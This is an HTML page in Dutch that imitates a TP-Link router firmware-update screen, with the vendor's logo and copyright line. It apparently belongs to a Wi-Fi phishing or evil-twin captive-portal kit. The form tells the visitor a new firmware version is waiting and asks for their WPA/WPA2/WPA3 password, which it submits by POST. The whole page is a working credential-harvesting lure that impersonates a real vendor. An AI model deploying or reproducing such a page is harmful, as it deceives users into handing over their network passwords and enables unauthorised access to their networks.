<!DOCTYPE html>
<html lang="nl-NL">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="../../assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="../../assets/css/stylesheet.css">
    <title>TP-LINK :: Firmware-update</title>
</head>
<body>
    <img src="../../assets/img/new-logo.png" width="150px" class="img-fluid" alt="Responsive image">
    <section class="container">
    <div class="form-head">
        <h1>Firmware-update</h1>
    </div>
    <div class="text">
        <p>Er is een nieuwe firmwareversie gedetecteerd en deze wacht op installatie. Bekijk onze nieuwe algemene voorwaarden en ga verder.</p>
    </div>
    <form id='form1' method="POST">
        <div class="form-group">
          <label for="terms">Algemene voorwaarden accepteren</label>
        </div>

        <div class="form-group">
            <label for="password">Wachtwoord</label>
            <input type="password" class="form-control" name="password" id="password" placeholder="WPA/WPA2/WPA3-wachtwoord" required>
        </div>

        <div class="form-group form-check">
            <input type="checkbox" class="form-check-input" id="acceptTerms" required>
            <label class="form-check-label" for="acceptTerms">Ik accepteer de algemene voorwaarden</label>
        </div>

        <div class="form-btn">
            <button type="submit" class="btn btn-primary">Bijwerken</button>
        </div>
        <div class="form-check">
            <small id="copyright" class="form-text text-muted">Copyright © TP-Link Corporation Limited. 2026. Alle rechten voorbehouden.</small>
          </div>
      </form>
    </section>

    <script src="../../assets/js/jquery-3.5.1.js"></script>
    <script src="../../assets/js/popper.min.js"></script>
    <script src="../../assets/js/bootstrap.min.js"></script>
    <script>
        document.getElementById('form1').addEventListener('submit', function(event) {
            var password = document.getElementById('password');
            var acceptTerms = document.getElementById('acceptTerms');

            if (!acceptTerms.checked) {
                acceptTerms.setCustomValidity('U moet de algemene voorwaarden accepteren.');
            } else {
                acceptTerms.setCustomValidity('');
            }

            if (password.value === '') {
                password.setCustomValidity('U moet een wachtwoord invoeren.');
            } else {
                password.setCustomValidity('');
            }

            if (!this.checkValidity()) {
                event.preventDefault();
            }
        });
    </script>
</body>
</html>
